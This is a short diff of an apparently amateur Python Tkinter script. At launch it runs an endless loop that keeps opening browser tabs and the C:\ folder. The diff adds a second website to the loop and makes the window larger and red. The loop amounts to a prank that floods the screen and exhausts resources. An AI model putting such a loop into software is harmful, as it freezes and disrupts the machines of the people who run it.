@@ -11,6 +11,7 @@ def open_git():
     # os.remove('1.py') # удаляет файл в папке
     while True:
         wb.open('https://github.com/')
+        wb.open('https://colorscheme.ru/html-colors.html')
         path = r'C:\\' # добавил открытие папки в цикле
         os.startfile(path)
         print("Текущая директория:", os.getcwd()) # вывести текущую директорию в консоль
@@ -20,8 +21,8 @@ def open_git():
 
 root = Tk ()
 root.title ('')
-root.geometry ('350x350+200+200')
-root.config (bg = '')
+root.geometry ('550x550+200+200')
+root.config (bg = 'red')
 
 #Button (root, text="Не нажимать", command=open_git).pack()
 open_git() # запуск функции без нажатия кнопки
